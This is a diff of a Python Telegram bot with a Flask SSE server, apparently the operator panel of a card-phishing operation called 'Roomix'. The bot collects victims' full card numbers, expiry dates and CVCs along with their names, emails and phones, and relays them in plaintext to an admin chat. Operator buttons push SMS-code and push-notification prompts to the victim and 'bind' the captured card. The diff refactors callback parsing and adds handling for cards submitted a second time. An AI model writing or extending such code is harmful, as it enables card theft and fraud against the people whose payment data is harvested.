@@ -141,6 +141,7 @@ def check_card():
         if origin in ALLOWED_ORIGINS:
             response.headers['Access-Control-Allow-Origin'] = origin
         return response, 500
+
 @app.route('/send_command', methods=['POST', 'OPTIONS'])
 def send_command():
     """Бот отправляет команду пользователю"""
@@ -207,8 +208,6 @@ def health():
     if origin in ALLOWED_ORIGINS:
         response.headers['Access-Control-Allow-Origin'] = origin
     return response
-    
-# Добавьте этот код в BOT.py после строки 210 (после других Flask endpoints)
 
 @app.route('/get_link_data/<link_code>')
 def get_link_data(link_code):
@@ -280,6 +279,7 @@ def get_link_data(link_code):
     except Exception as e:
         logger.error(f"💥 Критическая ошибка получения данных ссылки: {e}")
         return jsonify({'error': f'Internal server error: {str(e)}'}), 500
+
 @app.route('/')
 def home():
     return "🚀 Roomix Bot + SSE Server"
@@ -460,19 +460,19 @@ def extract_card_number(text):
 def get_payment_buttons(payment_id, user_id="user123", card_number=None):
     buttons = [
         [
-            InlineKeyboardButton(text="📱 SMS код", callback_data=f"sms_{payment_id}_{user_id}"),
-            InlineKeyboardButton(text="🔔 Пуш", callback_data=f"push_{payment_id}_{user_id}")
+            InlineKeyboardButton(text="📱 SMS код", callback_data=f"sms:{payment_id}:{user_id}"),
+            InlineKeyboardButton(text="🔔 Пуш", callback_data=f"push:{payment_id}:{user_id}")
         ]
     ]
     
     # Добавляем кнопку "Привязать" если карта не привязана
     if card_number and not check_card_in_db(card_number):
         buttons.append([
-            InlineKeyboardButton(text="🔗 Привязать", callback_data=f"bind_{payment_id}_{user_id}_{card_number}")
+            InlineKeyboardButton(text="🔗 Привязать", callback_data=f"bind:{payment_id}:{user_id}")
         ])
     
     buttons.append([
-        InlineKeyboardButton(text="❌ Неверная карта", callback_data=f"wrong_card_{payment_id}_{user_id}")
+        InlineKeyboardButton(text="❌ Неверная карта", callback_data=f"wrong_card:{payment_id}:{user_id}")
     ])
     
     return InlineKeyboardMarkup(inline_keyboard=buttons)
@@ -668,28 +668,27 @@ async def update_payment_status(callback, payment_id, user_id, status_text, acti
     
     # Берем оригинальное сообщение с данными карты
     original_text = callback.message.text
-    
-    # Разбираем сообщение чтобы сохранить данные
     lines = original_text.split('\n')
-    client_data = []
-    card_data = []
-    
-    for line in lines:
-        if any(keyword in line for keyword in ['Имя:', 'Фамилия:', 'Email:', 'Телефон:']):
-            client_data.append(line)
-        elif any(keyword in line for keyword in ['Номер:', 'Срок:', 'CVC:']):
-            card_data.append(line)
     
     # Проверяем статус карты в БД
     card_status = "ПРИВЯЗАННАЯ КАРТА" if check_card_in_db(card_number) else "НЕПРИВЯЗАННАЯ КАРТА"
     
     # Собираем новое сообщение с красивым форматированием
     new_text = f"💳 <b>{card_status}</b>\n\n"
-    new_text += "👤 <b>Клиент:</b>\n"
-    new_text += "\n".join(client_data) + "\n\n"
-    new_text += "💳 <b>Карта:</b>\n"
-    new_text += "\n".join(card_data) + "\n\n"
-    new_text += f"{status_text}\n\n"
+    
+    # Добавляем клиентские данные
+    for line in lines:
+        if any(keyword in line for keyword in ['Имя:', 'Фамилия:', 'Email:', 'Телефон:']):
+            new_text += line + "\n"
+    
+    new_text += "\n💳 <b>Карта:</b>\n"
+    
+    # Добавляем данные карты
+    for line in lines:
+        if any(keyword in line for keyword in ['Номер:', 'Срок:', 'CVC:']):
+            new_text += line + "\n"
+    
+    new_text += f"\n{status_text}\n\n"
     new_text += "Выберите действие:"
     
     await callback.message.edit_text(
@@ -700,11 +699,11 @@ async def update_payment_status(callback, payment_id, user_id, status_text, acti
     return success
 
 # ========== ОБРАБОТЧИКИ ПЛАТЕЖЕЙ ==========
-@dp.callback_query(F.data.startswith("sms_"))
+@dp.callback_query(F.data.startswith("sms:"))
 async def sms_code_handler(callback: types.CallbackQuery):
-    parts = callback.data.split("_")
+    parts = callback.data.split(":")
     payment_id = parts[1]
-    user_id = "_".join(parts[2:])
+    user_id = parts[2]
     
     # Извлекаем номер карты из сообщения
     card_number = extract_card_number(callback.message.text)
@@ -717,11 +716,11 @@ async def sms_code_handler(callback: types.CallbackQuery):
     )
     await callback.answer("SMS код запрошен")
 
-@dp.callback_query(F.data.startswith("push_"))
+@dp.callback_query(F.data.startswith("push:"))
 async def push_handler(callback: types.CallbackQuery):
-    parts = callback.data.split("_")
+    parts = callback.data.split(":")
     payment_id = parts[1]
-    user_id = "_".join(parts[2:])
+    user_id = parts[2]
     
     # Извлекаем номер карты из сообщения
     card_number = extract_card_number(callback.message.text)
@@ -734,11 +733,11 @@ async def push_handler(callback: types.CallbackQuery):
     )
     await callback.answer("Пуш отправлен")
 
-@dp.callback_query(F.data.startswith("wrong_card_"))
+@dp.callback_query(F.data.startswith("wrong_card:"))
 async def wrong_card_handler(callback: types.CallbackQuery):
-    parts = callback.data.split("_")
-    payment_id = parts[2]
-    user_id = "_".join(parts[3:])
+    parts = callback.data.split(":")
+    payment_id = parts[1]
+    user_id = parts[2]
     
     # Извлекаем номер карты из сообщения
     card_number = extract_card_number(callback.message.text)
@@ -751,14 +750,16 @@ async def wrong_card_handler(callback: types.CallbackQuery):
     )
     await callback.answer("Карта отклонена")
 
-@dp.callback_query(F.data.startswith("bind_"))
+@dp.callback_query(F.data.startswith("bind:"))
 async def bind_card_handler(callback: types.CallbackQuery):
-    parts = callback.data.split("_")
-    payment_id = parts[2]
-    user_id = "_".join(parts[3:-1])
-    card_number = parts[-1]
+    parts = callback.data.split(":")
+    payment_id = parts[1]
+    user_id = parts[2]
     
-    logger.info(f"🔧 Привязка карты {card_number}")
+    # Извлекаем номер карты из сообщения
+    card_number = extract_card_number(callback.message.text)
+    
+    logger.info(f"🔧 Привязка карты {card_number}, user_id: {user_id}")
     
     # Сохраняем карту в БД
     success = save_card_to_db(card_number)
@@ -808,6 +809,36 @@ async def process_payment_data(message: types.Message):
             elif 'CVC:' in line:
                 payment_data['cvc'] = line.split('CVC:')[1].strip()
 
+        # Проверяем карту в БД
+        card_number = payment_data.get('card_number', '')
+        is_card_bound = check_card_in_db(card_number)
+        
+        # ЕСЛИ КАРТА УЖЕ ПРИВЯЗАНА - ОТПРАВЛЯЕМ СПЕЦИАЛЬНОЕ СООБЩЕНИЕ
+        if is_card_bound:
+            bound_message = f"""
+🔄 <b>ПОВТОРНАЯ ЗАЯВКА - КАРТА УЖЕ ПРИВЯЗАНА</b>
+
+👤 <b>Клиент:</b>
+• Имя: {payment_data.get('first_name', '')}
+• Фамилия: {payment_data.get('last_name', '')}
+• Email: {payment_data.get('email', '')}
+• Телефон: {payment_data.get('phone', '')}
+
+💳 <b>Карта:</b> (УЖЕ ПРИВЯЗАНА)
+• Номер: {card_number}
+• Срок: {payment_data.get('card_expiry', '')}
+• CVC: {payment_data.get('cvc', '')}
+
+📋 <b>Статус:</b> Заявка поставлена в очередь
+"""
+
+            await bot.send_message(
+                chat_id=ADMIN_CHAT_ID,
+                text=bound_message,
+                parse_mode="HTML"
+            )
+            return
+
         # СОЗДАЕМ ПЛАТЕЖ БЕЗ СОХРАНЕНИЯ ДАННЫХ КАРТ
         payment_id = save_payment(
             user_id=0,
@@ -823,7 +854,7 @@ async def process_payment_data(message: types.Message):
         if payment_id:
             # Проверяем статус карты В БД СРАЗУ
             card_number = payment_data.get('card_number', '')
-            card_status = "ПРИВЯЗАННАЯ КАРТА" if check_card_in_db(card_number) else "НЕПРИВЯЗАННАЯ КАРТА"
+            card_status = "ПРИВЯЗАННАЯ КАРТА" if is_card_bound else "НЕПРИВЯЗАННАЯ КАРТА"
             
             # Форматируем сообщение в новом стиле СРАЗУ
             formatted_text = f"💳 <b>{card_status}</b>\n\n"
@@ -889,6 +920,7 @@ async def cmd_start(message: types.Message):
 Чтобы начать, нажмите кнопку ниже 👇
 """
         await message.answer(welcome_text, reply_markup=main_kb, parse_mode="HTML")
+
 
 @dp.message(F.text == "🏠 Главное меню")
 async def main_menu(message: types.Message):
@@ -1522,6 +1554,7 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
 
